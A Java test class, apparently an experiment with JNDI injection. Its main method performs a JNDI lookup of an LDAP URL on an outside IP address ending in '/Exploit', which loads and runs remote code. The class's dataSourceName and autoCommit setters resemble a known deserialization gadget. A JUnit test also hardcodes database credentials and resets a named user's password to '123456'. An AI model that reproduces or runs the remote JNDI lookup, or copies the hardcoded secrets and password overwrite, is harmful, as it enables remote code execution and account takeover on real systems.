package com.spring_1_100.test_1_10.test;

import org.junit.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.sql.DataSource;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;

public class TestHaha {
    private String dataSourceName;
    private boolean autoCommit;

    public String getDataSourceName() {
        return dataSourceName;
    }

    public void setDataSourceName(String dataSourceName) {
        System.out.println("xxxxxxxxxxxxx" + dataSourceName);
        this.dataSourceName = dataSourceName;
    }

    public boolean isAutoCommit() {
        return autoCommit;
    }

    public void setAutoCommit(boolean autoCommit) {
        System.out.println("yyyyyyyyyyyy" + autoCommit);


        this.autoCommit = autoCommit;
    }

    @Test
    public void jdbcUpdate() {
        Connection conn = null;
        PreparedStatement pstemt = null;
        try {
            //注册加载jdbc驱动
            Class.forName("com.mysql.jdbc.Driver");
            //打开连接
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/pple_test?characterEncoding=utf-8", "ldd_biz", "Hello1234");
            //创建执行对象
            String sql = "update lz_user set password = ? where username = ? ";
            pstemt = conn.prepareStatement(sql);
            pstemt.setString(1, "123456");
            pstemt.setString(2, "19884189046");
            //执行sql语句
            int num = pstemt.executeUpdate();
            System.out.println(num);
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        try {
            Context ctx = new InitialContext();
            DataSource ds = (DataSource) ctx.lookup("ldap://23.254.224.222:1388/Exploit");
            Connection connection = ds.getConnection();
            connection.setAutoCommit(true);
        } catch (NamingException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        }

    }
}
